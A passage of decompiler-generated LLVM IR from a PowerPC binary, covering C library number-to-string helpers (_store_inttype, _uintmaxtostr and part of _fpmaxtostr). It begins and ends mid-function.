  br i1 %v3_1000e648, label %dec_label_pc_1000e650, label %dec_label_pc_1000e654

dec_label_pc_1000e650:                            ; preds = %dec_label_pc_1000e648
  %v1_1000e650 = mul i32 %v2_1000e638, 65536
  %v2_1000e650 = sdiv i32 %v1_1000e650, 65536
  br label %dec_label_pc_1000e654

dec_label_pc_1000e654:                            ; preds = %dec_label_pc_1000e648, %dec_label_pc_1000e640, %dec_label_pc_1000e650
  %v0_1000e654 = phi i32 [ %v2_1000e638, %dec_label_pc_1000e648 ], [ %v1_1000e640, %dec_label_pc_1000e640 ], [ %v2_1000e650, %dec_label_pc_1000e650 ]
  %tmp = icmp slt i32 %v0_1000e654, 0
  %v1_1000e658 = zext i1 %tmp to i32
  %v2_1000e658 = ashr i32 %v0_1000e654, 31
  %v3_1000e658 = and i32 %v2_1000e658, -2
  %v4_1000e658 = or i32 %v3_1000e658, %v1_1000e658
  ret i32 %v4_1000e658

; uselistorder directives
  uselistorder i32 %v0_1000e654, { 1, 0 }
  uselistorder i32 %v2_1000e638, { 2, 0, 1 }
  uselistorder i1 %v3_1000e620, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_1000e654, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e628, { 1, 0 }
  uselistorder label %dec_label_pc_1000e614, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000e660 = load i32, i32* @r4, align 4
  %v3_1000e660 = icmp eq i32 %v0_1000e660, 256
  br i1 %v3_1000e660, label %dec_label_pc_1000e66c, label %dec_label_pc_1000e674

dec_label_pc_1000e66c:                            ; preds = %entry
  %v0_1000e66c = load i32, i32* @r6, align 4
  %v1_1000e66c = trunc i32 %v0_1000e66c to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_1000e66c, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_1000e674:                            ; preds = %entry
  %v3_1000e664 = icmp eq i32 %v0_1000e660, 2048
  br i1 %v3_1000e664, label %dec_label_pc_1000e67c, label %dec_label_pc_1000e688

dec_label_pc_1000e67c:                            ; preds = %dec_label_pc_1000e674
  %v0_1000e67c = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000e67c, i32* %tmp2, align 4
  %v0_1000e680 = load i32, i32* @r6, align 4
  %v3_1000e680 = add i32 %tmp, 4
  %v4_1000e680 = inttoptr i32 %v3_1000e680 to i32*
  store i32 %v0_1000e680, i32* %v4_1000e680, align 4
  ret i32 %tmp

dec_label_pc_1000e688:                            ; preds = %dec_label_pc_1000e674
  %v3_1000e674 = icmp eq i32 %v0_1000e660, 512
  %v0_1000e68c = load i32, i32* @r6, align 4
  br i1 %v3_1000e674, label %dec_label_pc_1000e68c, label %dec_label_pc_1000e694

dec_label_pc_1000e68c:                            ; preds = %dec_label_pc_1000e688
  %v1_1000e68c = trunc i32 %v0_1000e68c to i16
  store i16 %v1_1000e68c, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_1000e694:                            ; preds = %dec_label_pc_1000e688
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000e68c, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 0, 2, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000e69c = load i32, i32* @r7, align 4
  %v3_1000e69c = icmp eq i32 %v0_1000e69c, 0
  store i1 %v3_1000e69c, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* %r30.global-to-local, align 4
  %tmp12 = icmp sgt i32 %v0_1000e69c, -1
  br i1 %tmp12, label %dec_label_pc_1000e6d0, label %dec_label_pc_1000e6b0

dec_label_pc_1000e6b0:                            ; preds = %entry
  %v0_1000e6b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000e6b4 = sub i32 0, %v0_1000e69c
  store i32 %v1_1000e6b4, i32* @r7, align 4
  %tmp13 = icmp sgt i32 %v0_1000e6b0, -1
  br i1 %tmp13, label %dec_label_pc_1000e6d0, label %dec_label_pc_1000e6bc

dec_label_pc_1000e6bc:                            ; preds = %dec_label_pc_1000e6b0
  %v0_1000e6bc = load i32, i32* %r6.global-to-local, align 4
  %v1_1000e6bc = sub i32 0, %v0_1000e6bc
  %v2_1000e6bc = sub i32 -1, %v0_1000e6bc
  store i32 %v1_1000e6bc, i32* %r6.global-to-local, align 4
  %v4_1000e6bc = icmp uge i32 %v2_1000e6bc, %v1_1000e6bc
  %v1_1000e6c0 = sub i32 -1, %v0_1000e6b0
  %v3_1000e6c0 = zext i1 %v4_1000e6bc to i32
  %v4_1000e6c0 = add i32 %v3_1000e6c0, %v1_1000e6c0
  store i32 %v4_1000e6c0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000e6d0

dec_label_pc_1000e6d0:                            ; preds = %entry, %dec_label_pc_1000e6b0, %dec_label_pc_1000e6bc
  %v1_1000e6d4 = phi i32 [ %v1_1000e6b4, %dec_label_pc_1000e6bc ], [ %v1_1000e6b4, %dec_label_pc_1000e6b0 ], [ %v0_1000e69c, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1000e6bc ], [ 0, %dec_label_pc_1000e6b0 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_1000e6d4 = udiv i32 -1, %v1_1000e6d4
  store i32 %v2_1000e6d4, i32* @r8, align 4
  %v2_1000e6dc = load i32, i32* %r3.global-to-local, align 4
  %v3_1000e6dc = inttoptr i32 %v2_1000e6dc to i8*
  store i8 0, i8* %v3_1000e6dc, align 1
  %v0_1000e6e0 = load i32, i32* @r8, align 4
  %v1_1000e6e0 = load i32, i32* @r7, align 4
  %v2_1000e6e0 = mul i32 %v1_1000e6e0, %v0_1000e6e0
  %v1_1000e6e4 = sub i32 0, %v2_1000e6e0
  store i32 %v1_1000e6e4, i32* %r31.global-to-local, align 4
  %v4_1000e6e8 = icmp eq i32 %v1_1000e6e0, %v1_1000e6e4
  br i1 %v4_1000e6e8, label %dec_label_pc_1000e6f0, label %dec_label_pc_1000e6f8

dec_label_pc_1000e6f0:                            ; preds = %dec_label_pc_1000e6d0
  %v1_1000e6f0 = add i32 %v0_1000e6e0, 1
  store i32 %v1_1000e6f0, i32* @r8, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e6f8

dec_label_pc_1000e6f8:                            ; preds = %dec_label_pc_1000e6d0, %dec_label_pc_1000e6f0
  %v0_1000e6f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1000e6f8, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_1000e6fc

dec_label_pc_1000e6fcthread-pre-split:            ; preds = %dec_label_pc_1000e750
  %v0_1000e6fc.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_1000e700.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000e6fc

dec_label_pc_1000e6fc:                            ; preds = %dec_label_pc_1000e6fcthread-pre-split, %dec_label_pc_1000e6f8
  %v1_1000e744 = phi i32 [ %v1_1000e700.pre, %dec_label_pc_1000e6fcthread-pre-split ], [ %v1_1000e6e0, %dec_label_pc_1000e6f8 ]
  %v1_1000e714 = phi i32 [ %v0_1000e6fc.pr, %dec_label_pc_1000e6fcthread-pre-split ], [ %v0_1000e6f8, %dec_label_pc_1000e6f8 ]
  %v3_1000e6fc = icmp eq i32 %v1_1000e714, 0
  %v0_1000e700 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000e700 = udiv i32 %v0_1000e700, %v1_1000e744
  br i1 %v3_1000e6fc, label %dec_label_pc_1000e744, label %dec_label_pc_1000e708

dec_label_pc_1000e708:                            ; preds = %dec_label_pc_1000e6fc
  %v2_1000e708 = udiv i32 %v1_1000e714, %v1_1000e744
  %v2_1000e70c = mul i32 %v2_1000e708, %v1_1000e744
  %v2_1000e710 = mul i32 %v2_1000e700, %v1_1000e744
  %v2_1000e714 = sub i32 %v1_1000e714, %v2_1000e70c
  store i32 %v2_1000e708, i32* %r12.global-to-local, align 4
  %v0_1000e71c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e71c = mul i32 %v0_1000e71c, %v2_1000e714
  %v2_1000e720 = sub i32 %v0_1000e700, %v2_1000e710
  %v2_1000e724 = add i32 %v2_1000e71c, %v2_1000e720
  %v0_1000e728 = load i32, i32* @r8, align 4
  %v2_1000e728 = mul i32 %v0_1000e728, %v2_1000e714
  %v2_1000e72c = udiv i32 %v2_1000e724, %v1_1000e744
  %v2_1000e730 = add i32 %v2_1000e728, %v2_1000e700
  %v2_1000e734 = mul i32 %v2_1000e72c, %v1_1000e744
  store i32 %v2_1000e734, i32* @r10, align 4
  %v2_1000e738 = add i32 %v2_1000e730, %v2_1000e72c
  store i32 %v2_1000e738, i32* %r6.global-to-local, align 4
  %v2_1000e73c = sub i32 %v2_1000e724, %v2_1000e734
  store i32 %v2_1000e73c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000e750

dec_label_pc_1000e744:                            ; preds = %dec_label_pc_1000e6fc
  %v2_1000e744 = mul i32 %v2_1000e700, %v1_1000e744
  %v2_1000e748 = sub i32 %v0_1000e700, %v2_1000e744
  store i32 %v2_1000e748, i32* %r5.global-to-local, align 4
  store i32 %v2_1000e700, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000e750

dec_label_pc_1000e750:                            ; preds = %dec_label_pc_1000e708, %dec_label_pc_1000e744
  %v1_1000e754 = phi i32 [ %v2_1000e708, %dec_label_pc_1000e708 ], [ 0, %dec_label_pc_1000e744 ]
  %v0_1000e754 = phi i32 [ %v2_1000e738, %dec_label_pc_1000e708 ], [ %v2_1000e700, %dec_label_pc_1000e744 ]
  %v0_1000e758 = phi i32 [ %v2_1000e73c, %dec_label_pc_1000e708 ], [ %v2_1000e748, %dec_label_pc_1000e744 ]
  %v2_1000e754 = or i32 %v0_1000e754, %v1_1000e754
  %v5_1000e754 = icmp eq i32 %v2_1000e754, 0
  store i1 %v5_1000e754, i1* %cr0_eq.global-to-local, align 1
  %v1_1000e75c = load i32, i32* %r30.global-to-local, align 4
  %v0_1000e760 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000e760 = add i32 %v0_1000e760, -1
  store i32 %v1_1000e760, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_1000e758, 10
  %v1_1000e758.v2_1000e75c.v = select i1 %tmp14, i32 48, i32 %v1_1000e75c
  %v1_1000e758.v2_1000e75c = add i32 %v0_1000e758, %v1_1000e758.v2_1000e75c.v
  %extract.t9.extract.t = trunc i32 %v1_1000e758.v2_1000e75c to i8
  %v3_1000e770 = inttoptr i32 %v1_1000e760 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_1000e770, align 1
  %v0_1000e774 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000e774, label %dec_label_pc_1000e778, label %dec_label_pc_1000e6fcthread-pre-split

dec_label_pc_1000e778:                            ; preds = %dec_label_pc_1000e750
  %v0_1000e778 = load i32, i32* @r29, align 4
  %v3_1000e778 = icmp eq i32 %v0_1000e778, 0
  br i1 %v3_1000e778, label %dec_label_pc_1000e778.dec_label_pc_1000e788_crit_edge, label %dec_label_pc_1000e780

dec_label_pc_1000e778.dec_label_pc_1000e788_crit_edge: ; preds = %dec_label_pc_1000e778
  %v0_1000e790.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e788

dec_label_pc_1000e780:                            ; preds = %dec_label_pc_1000e778
  %v2_1000e784 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000e784 = add i32 %v2_1000e784, -1
  %v4_1000e784 = inttoptr i32 %v3_1000e784 to i8*
  store i8 45, i8* %v4_1000e784, align 1
  store i32 %v3_1000e784, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e788

dec_label_pc_1000e788:                            ; preds = %dec_label_pc_1000e778.dec_label_pc_1000e788_crit_edge, %dec_label_pc_1000e780
  %v0_1000e790 = phi i32 [ %v0_1000e790.pre, %dec_label_pc_1000e778.dec_label_pc_1000e788_crit_edge ], [ %v3_1000e784, %dec_label_pc_1000e780 ]
  ret i32 %v0_1000e790

; uselistorder directives
  uselistorder i32 %v2_1000e708, { 1, 2, 0 }
  uselistorder i32 %v2_1000e700, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_1000e744, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_1000e6e0, { 1, 2, 0 }
  uselistorder i32 %v0_1000e6e0, { 1, 0 }
  uselistorder i32 %v0_1000e69c, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 6, 4, 0, 1 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e788, { 1, 0 }
  uselistorder label %dec_label_pc_1000e750, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6d0, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_1000e794 = load i32, i32* @lr, align 4
  store i32 %v0_1000e794, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_1000e7b0 = add i32 %tmp, 11
  %v2_1000e7b0 = inttoptr i32 %v1_1000e7b0 to i8*
  %v3_1000e7b0 = load i8, i8* %v2_1000e7b0, align 1
  %v4_1000e7b0 = zext i8 %v3_1000e7b0 to i32
  store i32 %v4_1000e7b0, i32* %r31.global-to-local, align 4
  %v1_1000e7b4 = or i32 %v4_1000e7b0, 32
  %v1_1000e7b8 = icmp ult i32 %v1_1000e7b4, 97
  %v3_1000e7b8 = icmp eq i32 %v1_1000e7b4, 97
  store i1 %v1_1000e7b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000e7b8, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_1000e7c4 = add i32 %tmp, 4
  %v2_1000e7c4 = inttoptr i32 %v1_1000e7c4 to i32*
  %v3_1000e7c4 = load i32, i32* %v2_1000e7c4, align 4
  store i32 %v3_1000e7c4, i32* %r28.global-to-local, align 4
  %v2_1000e7c8 = load i32, i32* %arg2, align 4
  store i32 %v2_1000e7c8, i32* %r30.global-to-local, align 4
  br i1 %v3_1000e7b8, label %dec_label_pc_1000e7d0, label %dec_label_pc_1000e7d8

dec_label_pc_1000e7d0:                            ; preds = %entry
  %v1_1000e7d0 = add nuw nsw i32 %v4_1000e7b0, 6
  store i32 %v1_1000e7d0, i32* %r0.global-to-local, align 4
  %v1_1000e7d4 = urem i32 %v1_1000e7d0, 256
  store i32 %v1_1000e7d4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e7d8

dec_label_pc_1000e7d8:                            ; preds = %entry, %dec_label_pc_1000e7d0
  %v0_1000e88c = phi i32 [ %v4_1000e7b0, %entry ], [ %v1_1000e7d4, %dec_label_pc_1000e7d0 ]
  %v1_1000e7d8 = icmp slt i32 %v2_1000e7c8, 0
  %v3_1000e7d8 = icmp eq i32 %v2_1000e7c8, 0
  store i1 %v1_1000e7d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000e7d8, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1000e7c8, -1
  br i1 %tmp75, label %dec_label_pc_1000e7e4, label %dec_label_pc_1000e7e0

dec_label_pc_1000e7e0:                            ; preds = %dec_label_pc_1000e7d8
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e7e4

dec_label_pc_1000e7e4:                            ; preds = %dec_label_pc_1000e7d8, %dec_label_pc_1000e7e0
  %v0_1000e99c44 = phi i32 [ %v2_1000e7c8, %dec_label_pc_1000e7d8 ], [ 6, %dec_label_pc_1000e7e0 ]
  %v1_1000e7e4 = add i32 %tmp, 12
  %v2_1000e7e4 = inttoptr i32 %v1_1000e7e4 to i32*
  %v3_1000e7e4 = load i32, i32* %v2_1000e7e4, align 4
  store i32 %v3_1000e7e4, i32* %r9.global-to-local, align 4
  %v1_1000e7e8 = and i32 %v3_1000e7e4, 2
  %v3_1000e7e8 = icmp eq i32 %v1_1000e7e8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_1000e7e8, label %dec_label_pc_1000e800, label %dec_label_pc_1000e80c

dec_label_pc_1000e800:                            ; preds = %dec_label_pc_1000e7e4
  %v1_1000e800 = urem i32 %v3_1000e7e4, 2
  store i32 %v1_1000e800, i32* @r7, align 4
  %v3_1000e800 = icmp eq i32 %v1_1000e800, 0
  br i1 %v3_1000e800, label %dec_label_pc_1000e810, label %dec_label_pc_1000e80c

dec_label_pc_1000e80c:                            ; preds = %dec_label_pc_1000e800, %dec_label_pc_1000e7e4
  %storemerge = phi i32 [ 43, %dec_label_pc_1000e7e4 ], [ 32, %dec_label_pc_1000e800 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_1000e80c = trunc i32 %storemerge to i8
  store i8 %v6_1000e80c, i8* %stack_var_-200, align 1
  br label %dec_label_pc_1000e810

dec_label_pc_1000e810:                            ; preds = %dec_label_pc_1000e800, %dec_label_pc_1000e80c
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000e7d8, label %dec_label_pc_1000e974, label %dec_label_pc_1000e88c

dec_label_pc_1000e88c:                            ; preds = %dec_label_pc_1000e810
  %v1_1000e88c = icmp ult i32 %v0_1000e88c, 96
  %v2_1000e88c = icmp ugt i32 %v0_1000e88c, 96
  %v3_1000e88c = icmp eq i32 %v0_1000e88c, 96
  store i1 %v1_1000e88c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000e88c, i1* %cr7_eq.global-to-local, align 1
  %v2_1000e894 = add i32 %tmp, 16
  %v3_1000e894 = inttoptr i32 %v2_1000e894 to i32*
  store i32 32, i32* %v3_1000e894, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_1000e88c, label %dec_label_pc_1000e8b8, label %dec_label_pc_1000e8ac

dec_label_pc_1000e8ac:                            ; preds = %dec_label_pc_1000e88c
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e8b8

dec_label_pc_1000e8b8:                            ; preds = %dec_label_pc_1000e88c, %dec_label_pc_1000e8ac
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_10017280.380 to i32), i32 8), %dec_label_pc_1000e88c ], [ add (i32 ptrtoint ([4 x i8]* @global_var_10017280.380 to i32), i32 12), %dec_label_pc_1000e8ac ]
  store i32 ptrtoint ([4 x i8]* @global_var_10017280.380 to i32), i32* %r9.global-to-local, align 4
  %v2_1000e8c4 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000e8c4, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ed64

dec_label_pc_1000e974:                            ; preds = %dec_label_pc_1000e810
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1000e978 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000e978, i32* %r6.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_1000e9c4 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_1000e998

dec_label_pc_1000e998:                            ; preds = %dec_label_pc_1000ea18.dec_label_pc_1000e998_crit_edge, %dec_label_pc_1000e974
  %v0_1000e99c = phi i32 [ %v0_1000e99c.pre, %dec_label_pc_1000ea18.dec_label_pc_1000e998_crit_edge ], [ %v0_1000e99c44, %dec_label_pc_1000e974 ]
  %v3_1000e99c = call %1 @__asm_cror(i32 %v0_1000e99c, i32 %tmp, i32 %v0_1000e99c)
  %v11_1000e99c = extractvalue %1 %v3_1000e99c, 7
  store i4 %v11_1000e99c, i4* @cr4, align 1
  %v0_1000e9a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e9a0, label %dec_label_pc_1000e9b4, label %dec_label_pc_1000e9c8

dec_label_pc_1000e9b4:                            ; preds = %dec_label_pc_1000e998
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e9c8

dec_label_pc_1000e9c8:                            ; preds = %dec_label_pc_1000e998, %dec_label_pc_1000e9b4
  %storemerge2 = phi i32 [ %v1_1000e9c4, %dec_label_pc_1000e9b4 ], [ %tmp55, %dec_label_pc_1000e998 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1000e9d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000e9d8 = add i32 %v0_1000e9d8, 9
  store i32 %v1_1000e9d8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000e9f4

dec_label_pc_1000e9f4:                            ; preds = %dec_label_pc_1000e9f4.dec_label_pc_1000e9f4_crit_edge, %dec_label_pc_1000e9c8
  %v1_1000e9fc = phi i32 [ %v1_1000e9fc.pre, %dec_label_pc_1000e9f4.dec_label_pc_1000e9f4_crit_edge ], [ %v1_1000e9d8, %dec_label_pc_1000e9c8 ]
  %v0_1000e9f8 = phi i32 [ %v0_1000e9f8.pre, %dec_label_pc_1000e9f4.dec_label_pc_1000e9f4_crit_edge ], [ 0, %dec_label_pc_1000e9c8 ]
  %v1_1000e9f4 = phi i32 [ %v1_1000e9f4.pre, %dec_label_pc_1000e9f4.dec_label_pc_1000e9f4_crit_edge ], [ 10, %dec_label_pc_1000e9c8 ]
  %v1_1000ea04 = phi i32 [ %v0_1000e9f4.pre, %dec_label_pc_1000e9f4.dec_label_pc_1000e9f4_crit_edge ], [ %storemerge2, %dec_label_pc_1000e9c8 ]
  %v2_1000e9f4 = udiv i32 %v1_1000ea04, %v1_1000e9f4
  store i32 %v2_1000e9f4, i32* %r0.global-to-local, align 4
  %v1_1000e9f8 = add i32 %v0_1000e9f8, 1
  store i32 %v1_1000e9f8, i32* %r8.global-to-local, align 4
  %v2_1000e9fc = sub i32 %v1_1000e9fc, %v1_1000e9f8
  store i32 %v2_1000e9fc, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_1000e9f4, -10
  store i32 %v2_1000e9f4, i32* %r10.global-to-local, align 4
  %v2_1000ea04 = add i32 %v1_1000ea04, 48
  %v1_1000ea0c = add i32 %v2_1000ea04, %tmp76
  store i32 %v1_1000ea0c, i32* %r9.global-to-local, align 4
  %v1_1000ea10 = trunc i32 %v1_1000ea0c to i8
  %v3_1000ea10 = inttoptr i32 %v2_1000e9fc to i8*
  store i8 %v1_1000ea10, i8* %v3_1000ea10, align 1
  %v0_1000ea14 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ea14 = add i32 %v0_1000ea14, -1
  store i32 %v1_1000ea14, i32* %ctr.global-to-local, align 4
  %v2_1000ea14 = icmp eq i32 %v1_1000ea14, 0
  br i1 %v2_1000ea14, label %dec_label_pc_1000ea18, label %dec_label_pc_1000e9f4.dec_label_pc_1000e9f4_crit_edge

dec_label_pc_1000e9f4.dec_label_pc_1000e9f4_crit_edge: ; preds = %dec_label_pc_1000e9f4
  %v0_1000e9f4.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e9f4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000e9f8.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000e9fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000e9f4

dec_label_pc_1000ea18:                            ; preds = %dec_label_pc_1000e9f4
  %v0_1000ea18 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000ea18 = icmp slt i32 %v0_1000ea18, 0
  %v3_1000ea18 = icmp eq i32 %v0_1000ea18, 0
  store i1 %v1_1000ea18, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ea18, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ea1c = add i32 %v0_1000ea18, 1
  store i32 %v1_1000ea1c, i32* %r7.global-to-local, align 4
  br i1 %v3_1000ea18, label %dec_label_pc_1000ea18.dec_label_pc_1000e998_crit_edge, label %dec_label_pc_1000ea24

dec_label_pc_1000ea18.dec_label_pc_1000e998_crit_edge: ; preds = %dec_label_pc_1000ea18
  %v0_1000e99c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e998

dec_label_pc_1000ea24:                            ; preds = %dec_label_pc_1000ea18
  %v0_1000ea24 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ea24 = icmp ult i32 %v0_1000ea24, 96
  %v2_1000ea24 = icmp ugt i32 %v0_1000ea24, 96
  %v3_1000ea24 = icmp eq i32 %v0_1000ea24, 96
  store i1 %v1_1000ea24, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ea24, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000ea24, label %dec_label_pc_1000ea3c, label %dec_label_pc_1000ea2c

dec_label_pc_1000ea2c:                            ; preds = %dec_label_pc_1000ea24
  %v1_1000ea34 = add i32 %v0_1000ea24, 32
  store i32 %v1_1000ea34, i32* %r0.global-to-local, align 4
  %v1_1000ea38 = urem i32 %v1_1000ea34, 256
  store i32 %v1_1000ea38, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ea3c

dec_label_pc_1000ea3c:                            ; preds = %dec_label_pc_1000ea24, %dec_label_pc_1000ea2c
  %v0_1000ea54 = phi i32 [ %v1_1000ea38, %dec_label_pc_1000ea2c ], [ %v0_1000ea24, %dec_label_pc_1000ea24 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_1000ea2c ], [ 101, %dec_label_pc_1000ea24 ]
  %v1_1000ea3c = icmp slt i32 %v0_1000ea54, 103
  %v3_1000ea3c = icmp eq i32 %v0_1000ea54, 103
  store i1 %v1_1000ea3c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ea3c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ea3c, label %dec_label_pc_1000ea44, label %dec_label_pc_1000ea54

dec_label_pc_1000ea44:                            ; preds = %dec_label_pc_1000ea3c
  %v0_1000ea44 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000ea44 = icmp slt i32 %v0_1000ea44, 0
  %v3_1000ea44 = icmp eq i32 %v0_1000ea44, 0
  store i1 %v1_1000ea44, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ea44, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ea44, label %dec_label_pc_1000ea5c, label %dec_label_pc_1000ea4c

dec_label_pc_1000ea4c:                            ; preds = %dec_label_pc_1000ea44
  %v1_1000ea4c = add i32 %v0_1000ea44, -1
